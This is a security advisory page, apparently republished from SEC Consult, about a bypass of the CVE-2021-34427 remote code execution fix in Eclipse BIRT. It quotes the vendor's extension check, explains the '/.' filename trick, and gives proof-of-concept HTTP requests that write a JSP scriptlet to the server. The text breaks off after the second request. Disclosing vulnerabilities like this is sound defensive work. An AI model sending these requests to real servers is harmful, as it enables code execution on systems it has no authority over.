---
title: Eclipse Business Intelligence Reporting Tool 4.11.0 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2022120053
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-01
fetch_date: 2025-10-04T02:49:32.320059
---

# Eclipse Business Intelligence Reporting Tool 4.11.0 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Eclipse Business Intelligence Reporting Tool 4.11.0 Remote Code Execution** **2022.12.31**  Credit:  **[Armin Stock](https://cxsecurity.com/author/Armin%2BStock/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2021-34427](https://cxsecurity.com/cveshow/CVE-2021-34427/ "Click to see CVE-2021-34427")**  CWE: **[CWE-20](https://cxsecurity.com/cwe/CWE-20 "CWE-20")**  CVSS Base Score: **7.5/10**  Impact Subscore: **6.4/10**  Exploitability Subscore: **10/10**  Exploit range: **Remote**  Attack complexity: **Low**  Authentication: **No required**  Confidentiality impact: **Partial**  Integrity impact: **Partial**  Availability impact: **Partial** | |

SEC Consult Vulnerability Lab Security Advisory < 20221216-0 >
=======================================================================
title: Remote code execution - CVE-2021-34427 bypass
product: Eclipse Business Intelligence Reporting Tool (BiRT)
vulnerable version: <= 4.11.0
fixed version: 4.12
CVE number: CVE-2021-34427
impact: High
homepage: https://eclipse.github.io/birt-website/
found: 2022-10-05
by: Armin Stock (Atos)
SEC Consult Vulnerability Lab
An integrated part of SEC Consult, an Atos company
Europe | Asia | North America
https://www.sec-consult.com
=======================================================================
Vendor description:
-------------------
"With BIRT you can create data visualizations, dashboards and reports
that can be embedded into web applications and rich clients. Make information out
of your data!"
https://eclipse.github.io/birt-website/
Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.
Vulnerability overview/description:
-----------------------------------
1) Remote code execution - CVE-2021-34427 bypass
The vulnerability described in CVE-2021-34427 (https://www.cvedetails.com/cve/CVE-2021-34427/)
allows an attacker to execute code on the server, by creating a `.jsp` file
with the `BiRT - WebViewerExample`. This was fixed with the following code:
-------------------------------------------------------------------------------
// viewer/org.eclipse.birt.report.viewer/birt/WEB-INF/classes/org/eclipse/birt/report/context/ViewerAttributeBean.java#L1081
protected static void checkExtensionAllowedForRPTDocument(String rptDocumentName) throws ViewerException {
int extIndex = rptDocumentName.lastIndexOf(".");
String extension = null;
boolean validExtension = true;
if (extIndex > -1 && (extIndex + 1) < rptDocumentName.length()) {
extension = rptDocumentName.substring(extIndex + 1);
if (!disallowedExtensionsForRptDocument.isEmpty()
&& disallowedExtensionsForRptDocument.contains(extension)) {
validExtension = false;
}
if (!allowedExtensionsForRptDocument.isEmpty() && !allowedExtensionsForRptDocument.contains(extension)) {
validExtension = false;
}
if (!validExtension) {
throw new ViewerException(BirtResources.getMessage(
ResourceConstants.ERROR\_INVALID\_EXTENSION\_FOR\_DOCUMENT\_PARAMETER, new String[] { extension }));
}
}
}
-------------------------------------------------------------------------------
This fix can be easily bypassed by adding `/.` to the filename which allows
an attacker to execute arbitrary code.
Proof of concept:
-----------------
1) Remote code execution - CVE-2021-34427 bypass
The old exploit results in an error message:
-------------------------------------------------------------------------------
GET /birt/document?\_\_report=test.rptdesign&sample=<@urlencode\_all><% out.println("OS: " + System.getProperty("os.name")); out.println("Current dir: " +
getServletContext().getRealPath("/"));%><@/urlencode\_all>&\_\_document=<@urlencode>./test/info-new.jsp<@/urlencode> HTTP/1.1
Host: IP:18080
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.8,de-DE;q=0.5,de;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=C2A5FE509AD277742111569F8656881A
Upgrade-Insecure-Requests: 1
-------------------------------------------------------------------------------
Response:
-------------------------------------------------------------------------------
HTTP/1.1 200
Set-Cookie: JSESSIONID=A1E37E7FEC80DFFF155CAF9F642ADEB7; Path=/birt; HttpOnly
Content-Type: text/html;charset=utf-8
Date: Wed, 05 Oct 2022 06:14:54 GMT
Connection: close
Content-Length: 4644
<html>
<head>
<title>Error</title>
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8"/>
</head>
<body>
<div id="birt\_errorPage" style="color:red">
<span id="error\_icon" style="cursor:pointer" onclick="if (document.getElementById('error\_detail').style.display == 'none') { document.getElementById('error\_icon').innerHTML = '- ';
document.getElementById('error\_detail').style.display = 'block'; }else { document.getElementById('error\_icon').innerHTML = '+ '; document.getElementById('error\_detail').style.display = 'none'; }" > +
</span>
Invalid extension - "jsp" for the \_\_document parameter.
-------------------------------------------------------------------------------
But adding `/.` to the end of the filename creates the file on the server as
before:
-------------------------------------------------------------------------------
GET /birt/document?\_\_report=test.rptdesign&sample=<@urlencode\_all><% out.println("OS: " + System.getProperty("os.name")); out.println("Current dir: " +
getServletContext().getRealPath("/"));%><@/urlencode\_all>&\_\_document=<@urlencode>./test/info-new.jsp/.<@/urlencode> HTTP/1.1
Host: IP:18080
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.8,de-DE;q=0.5,de;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: JSESSIONID=C2A5FE509AD277742111569F8656881A
Upgrade-Insecure-Requests: 1
-------------------------------------------------------------------------------
--------------------------------------------...